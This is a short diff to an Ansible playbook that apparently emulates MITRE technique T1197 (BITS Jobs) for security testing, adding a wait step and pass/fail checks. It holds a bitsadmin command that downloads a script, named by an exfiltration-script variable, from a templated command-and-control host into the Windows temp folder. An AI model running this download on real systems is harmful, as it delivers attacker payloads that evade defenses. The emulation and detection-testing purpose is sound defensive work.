@@ -7,7 +7,19 @@
           - name: Download payload
             tags: always
             win_command: bitsadmin.exe  /transfer /Download /priority Foreground https://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} %TEMP%\bitsadmin_flag.ps1
+          - name: sleep for 10 seconds and continue with play if download was blocked or not
+            tags: always
+            wait_for: timeout=10
+            delegate_to: localhost
           - name: Check Payload downloaded
             tags: always
             win_command: type %TEMP%\bitsadmin_flag.ps1
             register: T1197
+          - name: check if playbook was successfull
+            tags: always
+            debug: msg="Playbook Completed:T1197:passed:win:"
+            when: '"net user /domain" in T1197.stdout'
+          - name: check if playbook was successfull
+            tags: always
+            debug: msg="Playbook Completed:T1197:failed:win:"
+            when: '"cannot find" in T1197.stdout' 
